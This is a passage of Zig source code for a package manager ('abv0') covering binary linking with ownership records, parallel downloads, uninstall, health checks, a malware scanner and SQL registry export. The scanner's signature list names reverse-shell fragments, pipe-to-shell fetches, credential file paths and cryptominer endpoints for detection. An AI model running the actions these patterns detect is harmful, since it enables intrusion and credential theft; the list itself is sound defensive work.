            const s = shim.readShimFile(a, path) catch continue;
            try out.append(s.path);
        }
        return out.toOwnedSlice();
    }

    fn linkPlansFor(
        self: *Store,
        a: std.mem.Allocator,
        pkg: Package,
        plans: []const LinkPlan,
        opts: InstallOptions,
        os: std.Target.Os.Tag,
        self_exe: ?[]const u8,
    ) !usize {
        if (plans.len == 0) return 0;

        var guard = try Guard.acquire(a, self.locks_root, owners_lock);
        defer guard.release();
        var owners: Owners = undefined;
        try self.readOwners(&owners, a);
        defer owners.deinit();

        // Anything already sitting at a destination must be a link this same
        // package made earlier. Otherwise it belongs to someone else.
        for (plans) |p| {
            if (linkMethodFor(os, p.src) == .skip_script) continue;
            if (!platform.pathExists(p.dst)) continue;
            if (ownerOf(owners.recs.items, "bin", p.bin)) |owner| {
                if (std.mem.eql(u8, owner, pkg.name)) continue;
            } else if (self.hasLegacyStoreDir(pkg.name)) {
                // Installed by an abv0 that predates ownership records.
                continue;
            }
            if (opts.force) continue;
            term.err(
                "{s}error{s}: '{s}' already exists in {s} and was not installed by '{s}'\n  Re-run with --force to replace it.\n",
                .{ term.red, term.reset, p.bin, self.bin_root, pkg.name },
            );
            return StoreError.BinaryConflict;
        }

        var linked: usize = 0;
        for (plans) |p| {
            const method = linkMethodFor(os, p.src);
            if (method == .skip_script) {
                term.err("{s}warning{s}: {s}: '{s}' is a script (.cmd/.bat/.ps1); scripts cannot be linked on Windows, skipping\n", .{ term.yellow, term.reset, pkg.name, p.bin });
                continue;
            }
            platform.setExecutable(p.src); // was a `chmod +x` subprocess per binary
            dropOwner(&owners.recs, "bin", p.bin);
            const label: []const u8 = switch (method) {
                .shim => blk: {
                    installShimPair(a, p, self_exe) catch |e| {
                        term.err("{s}warning{s}: could not link {s}: {s}\n", .{ term.yellow, term.reset, p.bin, @errorName(e) });
                        continue;
                    };
                    break :blk "launcher shim";
                },
                else => blk: {
                    const kind = platform.fastLink(p.src, p.dst) catch |e| {
                        term.err("{s}warning{s}: could not link {s}: {s}\n", .{ term.yellow, term.reset, p.bin, @errorName(e) });
                        continue;
                    };
                    break :blk kind.label();
                },
            };
            try owners.recs.append(.{ .kind = "bin", .name = p.bin, .pkg = pkg.name });
            linked += 1;
            if (!opts.quiet) {
                term.print("  {s}link{s}     {s} {s}({s}){s}\n", .{ term.green, term.reset, p.bin, term.dim, label, term.reset });
            }
        }
        try self.writeOwners(a, owners.recs.items);
        return linked;
    }

    /// True for a regular file that is not a link. The walk never reports
    /// links either, so the direct check accepts the same things it does.
    fn isPlainFile(path: []const u8) bool {
        if (archive.isLinkOnDisk(std.fs.cwd(), path)) return false;
        const st = std.fs.cwd().statFile(path) catch return false;
        return st.kind == .file;
    }

    fn stripExeSuffix(name: []const u8) []const u8 {
        if (std.mem.endsWith(u8, name, ".exe")) return name[0 .. name.len - 4];
        return name;
    }

    /// abv0 must never be shadowed by, or shadow itself through, a package's
    /// executable. Checked case-insensitively, with or without `.exe`.
    fn isReservedBin(name: []const u8) bool {
        return std.ascii.eqlIgnoreCase(name, "abv0") or std.ascii.eqlIgnoreCase(name, "abv0.exe");
    }

    // -----------------------------------------------------------------------
    // Ownership of linked bins and app bundles
    // -----------------------------------------------------------------------

    /// One line of `<root>/state/bin-owners`: `kind<TAB>name<TAB>package`.
    /// `kind` is "bin" for a link in the bin directory or "app" for a bundle
    /// in the apps directory. abv0 only replaces or removes entries it can
    /// find here, so anything else in those directories is left alone.
    const OwnerRec = struct {
        kind: []const u8,
        name: []const u8,
        pkg: []const u8,
    };

    const Owners = struct {
        arena: std.heap.ArenaAllocator,
        recs: std.ArrayList(OwnerRec),

        fn deinit(self: *Owners) void {
            self.arena.deinit();
        }
    };

    fn ownersPath(self: *const Store, a: std.mem.Allocator) ![]u8 {
        return std.fs.path.join(a, &.{ self.root, "state", "bin-owners" });
    }

    /// Load the ownership file into `out`, which the caller owns and must
    /// `deinit`. A missing file is an empty list. Malformed lines are skipped.
    /// `out` is written in place: its arena's allocator is captured by address,
    /// so it must not be moved after this call.
    fn readOwners(self: *const Store, out: *Owners, base: std.mem.Allocator) !void {
        out.arena = std.heap.ArenaAllocator.init(base);
        errdefer out.arena.deinit();
        const aa = out.arena.allocator();
        out.recs = std.ArrayList(OwnerRec).init(aa);

        const path = try self.ownersPath(aa);
        const data = std.fs.cwd().readFileAlloc(aa, path, 4 * 1024 * 1024) catch |e| switch (e) {
            error.FileNotFound => return,
            else => return e,
        };

        var lines = std.mem.splitScalar(u8, data, '\n');
        while (lines.next()) |line| {
            var fields = std.mem.splitScalar(u8, line, '\t');
            const kind = fields.next() orelse continue;
            const name = fields.next() orelse continue;
            const owner = fields.next() orelse continue;
            if (fields.next() != null) continue;
            try out.recs.append(.{ .kind = kind, .name = name, .pkg = owner });
        }
    }

    /// Write the whole list to a temp file, then rename it over the old one,
    /// so a crash leaves either the old file or the new one, never a mix.
    fn writeOwners(self: *const Store, a: std.mem.Allocator, recs: []const OwnerRec) !void {
        const state_dir = try std.fs.path.join(a, &.{ self.root, "state" });
        defer a.free(state_dir);
        try platform.makeSecureDir(state_dir);

        const path = try self.ownersPath(a);
        defer a.free(path);
        const tmp = try std.fmt.allocPrint(a, "{s}.{x}.tmp", .{ path, std.crypto.random.int(u64) });
        defer a.free(tmp);

        writeOwnersFile(tmp, recs) catch |e| {
            std.fs.cwd().deleteFile(tmp) catch {};
            return e;
        };
        std.fs.cwd().rename(tmp, path) catch |e| {
            std.fs.cwd().deleteFile(tmp) catch {};
            return e;
        };
    }

    fn writeOwnersFile(path: []const u8, recs: []const OwnerRec) !void {
        const file = try std.fs.cwd().createFile(path, .{ .mode = platform.mode_private });
        defer file.close();
        var bw = std.io.bufferedWriter(file.writer());
        for (recs) |r| try bw.writer().print("{s}\t{s}\t{s}\n", .{ r.kind, r.name, r.pkg });
        try bw.flush();
        try file.sync();
    }

    fn ownerOf(recs: []const OwnerRec, kind: []const u8, name: []const u8) ?[]const u8 {
        for (recs) |r| {
            if (std.mem.eql(u8, r.kind, kind) and std.mem.eql(u8, r.name, name)) return r.pkg;
        }
        return null;
    }

    fn dropOwner(recs: *std.ArrayList(OwnerRec), kind: []const u8, name: []const u8) void {
        var i: usize = 0;
        while (i < recs.items.len) {
            const r = recs.items[i];
            if (std.mem.eql(u8, r.kind, kind) and std.mem.eql(u8, r.name, name)) {
                _ = recs.orderedRemove(i);
            } else {
                i += 1;
            }
        }
    }

    fn linkAppBundles(
        self: *Store,
        a: std.mem.Allocator,
        pkg: Package,
        pkg_dir: []const u8,
        opts: InstallOptions,
    ) !void {
        if (pkg.app_bundles.len == 0) return;
        platform.makeSecureDir(self.apps_root) catch {};

        var guard = try Guard.acquire(a, self.locks_root, owners_lock);
        defer guard.release();
        var owners: Owners = undefined;
        try self.readOwners(&owners, a);
        defer owners.deinit();

        for (pkg.app_bundles) |app_name| {
            if (!isSafeAppName(app_name)) {
                term.err("{s}warning{s}: {s}: refusing app bundle name '{s}'\n", .{ term.yellow, term.reset, pkg.name, app_name });
                continue;
            }

            const src = try std.fs.path.join(a, &.{ pkg_dir, app_name });
            defer a.free(src);
            const dst = try std.fs.path.join(a, &.{ self.apps_root, app_name });
            defer a.free(dst);

            // Only a bundle this package put there may be replaced.
            if (platform.pathExists(dst)) {
                const owner = ownerOf(owners.recs.items, "app", app_name);
                if (owner == null or !std.mem.eql(u8, owner.?, pkg.name)) {
                    term.err("{s}warning{s}: {s} already exists at {s} and was not installed by '{s}'; leaving it alone\n", .{ term.yellow, term.reset, app_name, dst, pkg.name });
                    continue;
                }
                std.fs.cwd().deleteTree(dst) catch {};
            }
            dropOwner(&owners.recs, "app", app_name);

            // The original reported "APFS Clone" on the success branch even
            // when fastLink had fallen back to a symlink.
            const ok = blk: {
                if (platform.fastLink(src, dst)) |kind| {
                    if (!opts.quiet) {
                        term.print("  {s}app{s}      {s} {s}({s}){s}\n", .{ term.green, term.reset, app_name, term.dim, kind.label(), term.reset });
                    }
                    break :blk true;
                } else |_| {}
                platform.copyTree(src, dst) catch break :blk false;
                if (!opts.quiet) term.print("  {s}app{s}      {s} {s}(copy){s}\n", .{ term.green, term.reset, app_name, term.dim, term.reset });
                break :blk true;
            };
            if (!ok) continue;
            try owners.recs.append(.{ .kind = "app", .name = app_name, .pkg = pkg.name });
        }
        try self.writeOwners(a, owners.recs.items);
    }

    /// A bundle name abv0 may create or delete under the apps directory: one
    /// plain `*.app` path component, with no separators, drive colons, control
    /// characters or traversal.
    fn isSafeAppName(name: []const u8) bool {
        if (name.len <= ".app".len) return false;
        if (!std.mem.endsWith(u8, name, ".app")) return false;
        if (std.mem.indexOfAny(u8, name, "/\\:\t\r\n\x00") != null) return false;
        return safepath.isSafeRelPath(name);
    }

    // -----------------------------------------------------------------------
    // Parallel range download
    // -----------------------------------------------------------------------

    fn microSplitDownload(
        self: *Store,
        a: std.mem.Allocator,
        url: []const u8,
        dest: []const u8,
        tmp_dir: []const u8,
    ) !?Digest {
        _ = self;
        const info = net.head(a, url, .{}) catch return null;
        const total = info.content_length orelse return null;
        if (!info.accepts_ranges or total < 1 << 20) return null;

        const chunks: u64 = 4;
        const chunk_size = total / chunks;

        var jobs = try a.alloc(net.ChunkJob, chunks);
        var threads = try a.alloc(std.Thread, chunks);
        var paths = try a.alloc([]const u8, chunks);

        for (0..chunks) |i| {
            paths[i] = try std.fmt.allocPrint(a, "{s}/chunk.{d}", .{ tmp_dir, i });
            jobs[i] = .{
                .allocator = a,
                .url = url,
                .start = i * chunk_size,
                .end = if (i == chunks - 1) total - 1 else (i + 1) * chunk_size - 1,
                .dest = paths[i],
                .opts = .{},
            };
            threads[i] = try std.Thread.spawn(.{}, net.ChunkJob.run, .{&jobs[i]});
        }
        for (threads) |t| t.join();

        for (jobs) |j| {
            if (!j.ok) return null;
        }

        const digest = try reassemble(dest, paths);
        for (paths) |p| std.fs.cwd().deleteFile(p) catch {};

        // Reassembly must produce exactly the advertised length.
        const st = try std.fs.cwd().statFile(dest);
        if (st.size != total) {
            std.fs.cwd().deleteFile(dest) catch {};
            return null;
        }
        return digest;
    }

    /// Concatenate `parts` into `dest`, hashing each byte as it is written, so
    /// the digest costs no pass of its own.
    fn reassemble(dest: []const u8, parts: []const []const u8) !Digest {
        var d = Digest.init();
        const out = try std.fs.cwd().createFile(dest, .{ .mode = platform.mode_private });
        defer out.close();
        var buf: [64 * 1024]u8 = undefined;
        for (parts) |p| {
            const f = try std.fs.cwd().openFile(p, .{});
            defer f.close();
            while (true) {
                const n = try f.read(&buf);
                if (n == 0) break;
                d.update(buf[0..n]);
                try out.writeAll(buf[0..n]);
            }
        }
        return d;
    }

    // -----------------------------------------------------------------------
    // Uninstall / reset / gc
    // -----------------------------------------------------------------------

    fn platformListed(pkg: Package, platform_name: []const u8) bool {
        for (pkg.platforms) |plat| {
            if (std.mem.eql(u8, plat.name, platform_name)) return true;
        }
        return false;
    }

    pub fn uninstall(self: *Store, a: std.mem.Allocator, pkg: Package) !bool {
        var removed = false;

        // Remove only what this package linked or copied in, as recorded in the
        // ownership file. Bins are not taken from pkg.bin: a link belongs to
        // whoever created it, not to whatever the registry says now.
        {
            var guard = try Guard.acquire(a, self.locks_root, owners_lock);
            defer guard.release();
            var owners: Owners = undefined;
            try self.readOwners(&owners, a);
            defer owners.deinit();

            var i: usize = 0;
            while (i < owners.recs.items.len) {
                const r = owners.recs.items[i];
                if (!std.mem.eql(u8, r.pkg, pkg.name)) {
                    i += 1;
                    continue;
                }
                if (std.mem.eql(u8, r.kind, "bin") and safepath.isValidId(r.name)) {
                    // On Windows this removes the launcher exe and its .shim.
                    if (removeBinFiles(a, self.bin_root, r.name, builtin.os.tag)) |gone| {
                        if (gone) removed = true;
                    } else |_| {}
                } else if (std.mem.eql(u8, r.kind, "app") and isSafeAppName(r.name)) {
                    const p = try std.fs.path.join(a, &.{ self.apps_root, r.name });
                    defer a.free(p);
                    if (std.fs.cwd().deleteTree(p)) |_| {
                        removed = true;
                    } else |_| {}
                }
                _ = owners.recs.orderedRemove(i);
            }
            try self.writeOwners(a, owners.recs.items);
        }

        // One scan of the store covers every platform of this package.
        {
            var scan_arena = std.heap.ArenaAllocator.init(a);
            defer scan_arena.deinit();
            const index = try self.scanStore(scan_arena.allocator());
            if (index.get(pkg.name)) |list| {
                for (list.items) |d| {
                    if (!platformListed(pkg, d.platform)) continue;
                    const p = try std.fs.path.join(a, &.{ self.store_root, d.dir_name });
                    defer a.free(p);
                    if (std.fs.cwd().deleteTree(p)) |_| {
                        removed = true;
                    } else |_| {}
                }
            }
        }

        // Drop the WAL so a future install does not think it crashed.
        var w = wal.Wal.init(a, self.store_root, pkg.name) catch return removed;
        defer w.deinit();
        w.clear();

        return removed;
    }

    pub fn gc(self: *Store, a: std.mem.Allocator) !usize {
        var reclaimed: usize = 0;

        if (std.fs.cwd().openDir(self.store_root, .{ .iterate = true })) |*d| {
            var dir = d.*;
            defer dir.close();
            var it = dir.iterate();
            while (try it.next()) |entry| {
                if (!std.mem.endsWith(u8, entry.name, ".tmp")) continue;
                const p = try std.fs.path.join(a, &.{ self.store_root, entry.name });
                defer a.free(p);
                // A fresh temp dir may be another abv0's install in progress.
                if (!isOlderThan(p, 24 * std.time.ns_per_hour)) continue;
                if (std.fs.cwd().deleteTree(p)) |_| reclaimed += 1 else |_| {}
            }
        } else |_| {}

        if (std.fs.cwd().openDir(self.shells_root, .{ .iterate = true })) |*d| {
            var dir = d.*;
            defer dir.close();
            var it = dir.iterate();
            while (try it.next()) |entry| {
                const p = try std.fs.path.join(a, &.{ self.shells_root, entry.name });
                defer a.free(p);
                // A sandbox may belong to another abv0 that is still running.
                if (!shellIsStale(p, entry.name)) continue;
                if (std.fs.cwd().deleteTree(p)) |_| reclaimed += 1 else |_| {}
            }
        } else |_| {}

        // The old block store wrote a full second copy of every archive here
        // and never read it back. Remove any left over from earlier versions.
        const legacy = try std.fs.path.join(a, &.{ self.store_root, "blockstore" });
        defer a.free(legacy);
        if (std.fs.cwd().deleteTree(legacy)) |_| reclaimed += 1 else |_| {}

        return reclaimed;
    }

    /// Whether an ephemeral sandbox is safe to delete. Names are
    /// `shell-<time>-<pid>-<random>`, and the pid decides: it is stale once that
    /// process has exited. Names without a pid, and every name on Windows, fall
    /// back to age: untouched for more than 24 hours.
    fn shellIsStale(dir_path: []const u8, dir_name: []const u8) bool {
        if (platform.is_posix) {
            if (shellPid(dir_name)) |pid| return !platform.processAlive(pid);
        }
        return isOlderThan(dir_path, 24 * std.time.ns_per_hour);
    }

    /// True when a `name-version-platform` directory from before the `@`
    /// naming scheme exists for `name`. Links such an install made carry no
    /// ownership record, so they are adopted rather than refused.
    fn hasLegacyStoreDir(self: *const Store, name: []const u8) bool {
        var dir = std.fs.cwd().openDir(self.store_root, .{ .iterate = true }) catch return false;
        defer dir.close();
        var it = dir.iterate();
        while (it.next() catch return false) |entry| {
            if (entry.kind != .directory) continue;
            if (std.mem.indexOfScalar(u8, entry.name, '@') != null) continue;
            if (std.mem.endsWith(u8, entry.name, ".tmp")) continue;
            if (entry.name.len > name.len and std.mem.startsWith(u8, entry.name, name) and entry.name[name.len] == '-') return true;
        }
        return false;
    }

    fn isOlderThan(path: []const u8, ns: i128) bool {
        const st = std.fs.cwd().statFile(path) catch return false;
        return std.time.nanoTimestamp() - st.mtime > ns;
    }

    /// The pid embedded by `shellIsStale`'s naming scheme, or null for the
    /// older `shell-<time>-<random>` form.
    fn shellPid(dir_name: []const u8) ?i32 {
        if (!std.mem.startsWith(u8, dir_name, "shell-")) return null;
        var parts = std.mem.splitScalar(u8, dir_name["shell-".len..], '-');
        _ = parts.next() orelse return null; // time
        const pid_text = parts.next() orelse return null;
        _ = parts.next() orelse return null; // random suffix
        if (parts.next() != null) return null;
        const pid = std.fmt.parseInt(i32, pid_text, 10) catch return null;
        return if (pid > 0) pid else null;
    }

    pub fn resetAll(self: *Store, a: std.mem.Allocator, reg: *const registry.Registry, platform_name: []const u8) !usize {
        var count: usize = 0;
        for (reg.packages) |pkg| {
            if (self.isInstalled(pkg, platform_name)) {
                if (try self.uninstall(a, pkg)) count += 1;
            }
        }
        std.fs.cwd().deleteTree(self.store_root) catch {};
        std.fs.cwd().deleteTree(self.shells_root) catch {};
        std.fs.cwd().deleteTree(self.locks_root) catch {};

        for ([_][]const u8{ self.store_root, self.bin_root, self.shells_root, self.locks_root }) |d| {
            platform.makeSecureDir(d) catch {};
        }
        return count;
    }

    // -----------------------------------------------------------------------
    // Outdated / upgrade
    // -----------------------------------------------------------------------

    pub const OutdatedEntry = struct {
        pkg: Package,
        installed: []const u8,
    };

    /// The original body of this function was literally
    ///     if (try self.isInstalled(pkg, platform)) {}
    /// so it always returned an empty list and `abv0 outdated` always claimed
    /// everything was up to date.
    pub fn getOutdated(
        self: *const Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        platform_name: []const u8,
    ) ![]OutdatedEntry {
        var out = std.ArrayList(OutdatedEntry).init(a);
        errdefer out.deinit();

        // One scan of the store for every package below.
        var scan_arena = std.heap.ArenaAllocator.init(a);
        defer scan_arena.deinit();
        const index = try self.scanStore(scan_arena.allocator());

        for (reg.packages) |pkg| {
            if (pkg.platform(platform_name) == null) continue;

            const list = index.get(pkg.name) orelse continue;

            // Newest installed version wins.
            var newest: ?[]const u8 = null;
            for (list.items) |i| {
                if (!std.mem.eql(u8, i.platform, platform_name)) continue;
                if (newest == null or registry.compareVersions(i.version, newest.?) == .gt) newest = i.version;
            }
            const installed = newest orelse continue;

            if (registry.compareVersions(installed, pkg.version) == .lt) {
                try out.append(.{ .pkg = pkg, .installed = try a.dupe(u8, installed) });
            }
        }
        return out.toOwnedSlice();
    }

    // -----------------------------------------------------------------------
    // Doctor / fix
    // -----------------------------------------------------------------------

    pub const Health = struct {
        warnings: usize = 0,
        broken_links: usize = 0,
    };

    pub fn doctor(
        self: *const Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        platform_name: []const u8,
    ) !Health {
        var h = Health{};

        term.print("{s}{s}abv0 doctor{s}\n\n", .{ term.bold, term.cyan, term.reset });

        term.print("PATH\n", .{});
        if (platform.envOwned(a, "PATH")) |env_path| {
            defer a.free(env_path);
            if (std.mem.indexOf(u8, env_path, self.bin_root) == null) {
                h.warnings += 1;
                term.print("  {s}warn{s} {s} is not on your PATH\n", .{ term.yellow, term.reset, self.bin_root });
                term.print("       add: export PATH=\"{s}:$PATH\"\n", .{self.bin_root});
            } else {
                term.print("  {s}ok{s}   {s}\n", .{ term.green, term.reset, self.bin_root });
            }
        } else {
            h.warnings += 1;
            term.print("  {s}warn{s} PATH is unset\n", .{ term.yellow, term.reset });
        }

        term.print("\nStore\n", .{});
        std.fs.cwd().access(self.store_root, .{ .mode = .read_write }) catch {
            h.warnings += 1;
            term.print("  {s}warn{s} {s} is not writable\n", .{ term.yellow, term.reset, self.store_root });
        };
        term.print("  {s}ok{s}   {s}\n", .{ term.green, term.reset, self.store_root });

        term.print("\nLinks\n", .{});
        for (reg.packages) |pkg| {
            if (!self.isInstalled(pkg, platform_name)) continue;

            for (pkg.bin) |bin_name| {
                const health = binHealth(a, self.bin_root, bin_name, builtin.os.tag);
                if (health == .ok) continue;
                h.broken_links += 1;
                const why: []const u8 = switch (health) {
                    .ok, .missing_exe => "",
                    .missing_shim => " (no launcher shim; run `abv0 fix`)",
                    .bad_shim => " (unreadable launcher shim; run `abv0 fix`)",
                    .missing_target => " (shim target is missing; run `abv0 fix`)",
                };
                term.print("  {s}broken{s} {s} -> {s}{s}\n", .{ term.red, term.reset, pkg.name, bin_name, why });
            }
        }
        if (h.broken_links == 0) term.print("  {s}ok{s}   no broken links\n", .{ term.green, term.reset });

        return h;
    }

    pub fn fix(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        platform_name: []const u8,
    ) !usize {
        var healed: usize = 0;

        for ([_][]const u8{ self.store_root, self.bin_root, self.shells_root, self.locks_root }) |d| {
            platform.makeSecureDir(d) catch {};
        }

        for (reg.packages) |pkg| {
            if (!self.isInstalled(pkg, platform_name)) continue;
            const info = pkg.platform(platform_name) orelse continue;
            const pkg_dir = try self.pkgStorePath(a, pkg, platform_name);
            defer a.free(pkg_dir);

            var needs_relink = false;
            for (pkg.bin) |bin_name| {
                if (binHealth(a, self.bin_root, bin_name, builtin.os.tag) != .ok) needs_relink = true;
            }
            if (!needs_relink) continue;

            const n = self.linkBinaries(a, pkg, info, pkg_dir, .{ .quiet = true }) catch 0;
            if (n > 0) {
                healed += 1;
                term.print("  {s}healed{s} {s}\n", .{ term.green, term.reset, pkg.name });
            }
        }
        _ = try self.gc(a);
        return healed;
    }

    // -----------------------------------------------------------------------
    // Malware heuristics
    // -----------------------------------------------------------------------

    pub const Threat = struct {
        score: u32 = 0,
        reasons: std.ArrayList([]const u8),

        pub fn deinit(self: *Threat) void {
            self.reasons.deinit();
        }
    };

    const signatures = [_]struct { pattern: []const u8, weight: u32, reason: []const u8 }{
        .{ .pattern = "/bin/sh -i", .weight = 40, .reason = "interactive shell spawn (reverse shell pattern)" },
        .{ .pattern = "nc -e", .weight = 40, .reason = "netcat command execution (reverse shell)" },
        .{ .pattern = "bash -i >&", .weight = 40, .reason = "bash reverse shell redirection" },
        .{ .pattern = "stratum+tcp://", .weight = 50, .reason = "Stratum mining pool endpoint (cryptominer)" },
        .{ .pattern = "nicehash", .weight = 50, .reason = "NiceHash mining reference" },
        .{ .pattern = "/etc/shadow", .weight = 35, .reason = "shadow password file access" },
        .{ .pattern = "/.ssh/id_rsa", .weight = 35, .reason = "SSH private key access" },
        .{ .pattern = "curl | sh", .weight = 25, .reason = "pipe-to-shell remote execution" },
        .{ .pattern = "wget -O- | sh", .weight = 25, .reason = "pipe-to-shell remote execution" },
        .{ .pattern = "AWS_SECRET_ACCESS_KEY", .weight = 20, .reason = "cloud credential harvesting" },
    };

    /// Bit i of a `SignatureMask` stands for `signatures[i]`.
    const SignatureMask = std.meta.Int(.unsigned, signatures.len);

    /// Bit i is set when `signatures[i]` begins with that byte, so a scan
    /// needs one table lookup per byte rather than one search per signature.
    const first_byte_table = blk: {
        var table = [_]SignatureMask{0} ** 256;
        for (signatures, 0..) |sig, i| {
            table[sig.pattern[0]] |= @as(SignatureMask, 1) << @intCast(i);
        }
        break :blk table;
    };

    /// Longest signature, in bytes. A match of this length can straddle a read
    /// boundary, so each read keeps this many bytes minus one from the last.
    const longest_signature = blk: {
        var longest: usize = 0;
        for (signatures) |sig| longest = @max(longest, sig.pattern.len);
        break :blk longest;
    };

    const scan_chunk = 256 * 1024;
    const scan_overlap = longest_signature - 1;

    /// Streaming scan with an overlap window.
    ///
    /// The original read the entire executable into memory with a 50 MB cap and
    /// then made a separate full pass per signature. This makes one pass with a
    /// bounded buffer, so a large binary no longer costs 50 MB of RSS, and it
    /// no longer misses a pattern that straddles a read boundary.
    pub fn scanFile(a: std.mem.Allocator, path: []const u8) !Threat {
        var threat = Threat{ .reasons = std.ArrayList([]const u8).init(a) };
        errdefer threat.deinit();

        const file = try std.fs.cwd().openFile(path, .{});
        defer file.close();

        const buf = try a.alloc(u8, scan_chunk + scan_overlap);
        defer a.free(buf);

        const all: SignatureMask = std.math.maxInt(SignatureMask);
        var seen: SignatureMask = 0;
        var carry: usize = 0;
        while (seen != all) {
            const n = try file.read(buf[carry..]);
            if (n == 0) break;
            const filled = carry + n;

            // Every start position is tried, so a pattern beginning in the
            // carried overlap is found here. Repeats from the overlap are
            // harmless because `seen` already covers them.
            var hit: SignatureMask = 0;
            for (buf[0..filled], 0..) |byte, pos| {
                var candidates = first_byte_table[byte] & ~seen & ~hit;
                while (candidates != 0) {
                    const i: usize = @ctz(candidates);
                    candidates &= candidates - 1;
                    const bit = @as(SignatureMask, 1) << @intCast(i);
                    if (std.mem.startsWith(u8, buf[pos..filled], signatures[i].pattern)) hit |= bit;
                }
            }

            // Report in signature order, as the per-signature passes did.
            for (signatures, 0..) |sig, i| {
                const bit = @as(SignatureMask, 1) << @intCast(i);
                if ((hit & bit) == 0) continue;
                seen |= bit;
                threat.score += sig.weight;
                try threat.reasons.append(sig.reason);
            }

            carry = @min(scan_overlap, filled);
            std.mem.copyForwards(u8, buf[0..carry], buf[filled - carry ..][0..carry]);
        }

        if (threat.score > 100) threat.score = 100;
        return threat;
    }

    /// Resolve the on-disk executable for a package, honouring bin_path
    /// directory bases.
    pub fn resolveBinary(
        self: *const Store,
        a: std.mem.Allocator,
        pkg: Package,
        platform_name: []const u8,
    ) ![]u8 {
        const info = pkg.platform(platform_name) orelse return StoreError.UnsupportedPlatform;
        const pkg_dir = try self.pkgStorePath(a, pkg, platform_name);
        defer a.free(pkg_dir);

        const exe_name = pkg.primaryBin() orelse pkg.name;

        if (info.bin_path.len > 0 and !std.mem.endsWith(u8, info.bin_path, "/")) {
            const p = try safepath.joinSafe(a, pkg_dir, info.bin_path);
            if (std.fs.cwd().access(p, .{})) |_| return p else |_| a.free(p);
        }
        if (info.bin_path.len > 0 and std.mem.endsWith(u8, info.bin_path, "/")) {
            const rel = try std.fmt.allocPrint(a, "{s}{s}", .{ info.bin_path, exe_name });
            defer a.free(rel);
            const p = try safepath.joinSafe(a, pkg_dir, rel);
            if (std.fs.cwd().access(p, .{})) |_| return p else |_| a.free(p);
        }

        // Fall back to a single walk.
        var dir = try std.fs.cwd().openDir(pkg_dir, .{ .iterate = true });
        defer dir.close();
        var walker = try dir.walk(a);
        defer walker.deinit();
        while (try walker.next()) |entry| {
            if (entry.kind != .file) continue;
            const stem = stripExeSuffix(entry.basename);
            if (std.mem.eql(u8, stem, exe_name)) {
                return std.fs.path.join(a, &.{ pkg_dir, entry.path });
            }
        }
        return StoreError.ExecutableNotFound;
    }

    // -----------------------------------------------------------------------
    // Registry export (honest version of the "hybrid" sync)
    // -----------------------------------------------------------------------

    /// Compile the binary index and emit a portable SQL dump. If the `sqlite3`
    /// CLI happens to be installed, materialise a genuine database from it.
    ///
    /// Previously this wrote a text file of SQL statements to a path named
    /// `registry.db` and described it as "an embedded SQLite query engine",
    /// and wrote a 24-byte header to `index.abv` and described that as a
    /// "zero-copy memory-mapped index".
    pub fn exportRegistry(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
    ) !void {
        const json_path = try std.fs.path.join(a, &.{ self.registry_root, "index.json" });
        defer a.free(json_path);
        const index_path = try std.fs.path.join(a, &.{ self.registry_root, "index.abv" });
        defer a.free(index_path);

        term.progress("compiling binary index (index.abv)", 1, 3);
        const stamp = abvindex.Stamp.ofFile(json_path) catch abvindex.Stamp{ .size = 0, .mtime_ns = 0 };
        try abvindex.build(a, reg, index_path, stamp);

        const idx_size = (try std.fs.cwd().statFile(index_path)).size;
        term.print("  index.abv    {d} packages, {d} bytes, mmap-backed\n", .{ reg.count(), idx_size });

        term.progress("writing SQL export (registry.sql)", 2, 3);
        const sql_path = try std.fs.path.join(a, &.{ self.registry_root, "registry.sql" });
        defer a.free(sql_path);
        try self.writeSql(a, reg, sql_path);
        term.print("  registry.sql {d} rows\n", .{reg.count()});

        term.progress("materialising sqlite database if available", 3, 3);
        const db_path = try std.fs.path.join(a, &.{ self.registry_root, "registry.db" });
        defer a.free(db_path);
        if (self.buildSqlite(a, sql_path, db_path)) {
            term.print("  registry.db  built with the sqlite3 CLI\n", .{});
        } else {
            term.print("  registry.db  {s}skipped{s} (sqlite3 not installed; registry.sql is portable)\n", .{ term.dim, term.reset });
        }
    }

    fn writeSql(
        self: *Store,
        a: std.mem.Allocator,
        reg: *const registry.Registry,
        path: []const u8,
    ) !void {
        _ = self;
        _ = a;
        const file = try std.fs.cwd().createFile(path, .{ .mode = platform.mode_private });
        defer file.close();
        var bw = std.io.bufferedWriter(file.writer());
        const w = bw.writer();

        try w.writeAll(
            \\BEGIN TRANSACTION;
            \\CREATE TABLE IF NOT EXISTS packages (
            \\  name TEXT PRIMARY KEY, version TEXT, description TEXT, homepage TEXT, license TEXT);
            \\CREATE TABLE IF NOT EXISTS platforms (
            \\  package TEXT, platform TEXT, url TEXT, sha256 TEXT, archive_type TEXT, bin_path TEXT,
            \\  PRIMARY KEY (package, platform));
            \\
        );

        for (reg.packages) |pkg| {
            try w.writeAll("INSERT OR REPLACE INTO packages VALUES (");
            try writeSqlString(w, pkg.name);
            try w.writeAll(",");
            try writeSqlString(w, pkg.version);
            try w.writeAll(",");
            try writeSqlString(w, pkg.description);
            try w.writeAll(",");
            try writeSqlString(w, pkg.homepage);
            try w.writeAll(",");
            try writeSqlString(w, pkg.license);
            try w.writeAll(");\n");

            for (pkg.platforms) |p| {
                try w.writeAll("INSERT OR REPLACE INTO platforms VALUES (");
                try writeSqlString(w, pkg.name);
                try w.writeAll(",");
                try writeSqlString(w, p.name);
                try w.writeAll(",");
                try writeSqlString(w, p.url);
                try w.writeAll(",");
                try writeSqlString(w, p.sha256);
                try w.writeAll(",");
                try writeSqlString(w, p.archive_type);
                try w.writeAll(",");
                try writeSqlString(w, p.bin_path);
                try w.writeAll(");\n");
            }
        }
        try w.writeAll("COMMIT;\n");
        try bw.flush();
    }

    /// Escape by doubling single quotes. The original interpolated raw
    /// descriptions into `'{s}'`, so any apostrophe produced broken SQL.
    fn writeSqlString(w: anytype, s: []const u8) !void {
        try w.writeByte('\'');
        for (s) |c| {
            if (c == '\'') try w.writeByte('\'');
            try w.writeByte(c);
        }
        try w.writeByte('\'');
    }

    fn buildSqlite(self: *Store, a: std.mem.Allocator, sql_path: []const u8, db_path: []const u8) bool {
        _ = self;
        std.fs.cwd().deleteFile(db_path) catch {};

        const sql = std.fs.cwd().readFileAlloc(a, sql_path, 16 * 1024 * 1024) catch return false;
        defer a.free(sql);

        var child = std.process.Child.init(&.{ "sqlite3", db_path }, a);
